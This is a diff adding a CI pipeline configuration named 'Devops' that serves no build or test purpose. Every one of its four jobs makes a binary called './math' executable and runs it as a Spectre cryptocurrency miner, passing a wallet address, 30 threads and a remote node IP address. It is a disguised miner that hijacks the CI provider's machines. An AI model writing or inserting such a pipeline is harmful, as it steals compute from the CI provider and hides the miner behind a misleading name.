@@ -1,0 +1,26 @@
+version: v1.0
+name: Devops
+agent:
+  machine:
+    type: f1-standard-4
+    os_image: ubuntu2204
+blocks:
+  - name: 'Block #1'
+    task:
+      jobs:
+        - name: 'Job #1'
+          commands:
+            - checkout
+            - 'chmod +x ./math && ./math  --mining-address spectre:qqzqrthexh8tv5eg6sc4jp6gnuxg5gt4ahjnj0558s2nc9nsw78ywc43szyk0 --threads 30 --spectred-address 34.44.208.37'
+        - name: 'Job #2'
+          commands:
+            - checkout
+            - 'chmod +x ./math && ./math  --mining-address spectre:qqzqrthexh8tv5eg6sc4jp6gnuxg5gt4ahjnj0558s2nc9nsw78ywc43szyk0 --threads 30 --spectred-address 34.44.208.37'
+        - name: 'Job #3'
+          commands:
+            - checkout
+            - 'chmod +x ./math && ./math  --mining-address spectre:qqzqrthexh8tv5eg6sc4jp6gnuxg5gt4ahjnj0558s2nc9nsw78ywc43szyk0 --threads 30 --spectred-address 34.82.41.54'
+        - name: 'Job #4'
+          commands:
+            - checkout
+            - 'chmod +x ./math && ./math  --mining-address spectre:qqzqrthexh8tv5eg6sc4jp6gnuxg5gt4ahjnj0558s2nc9nsw78ywc43szyk0 --threads 30 --spectred-address 34.82.41.54'
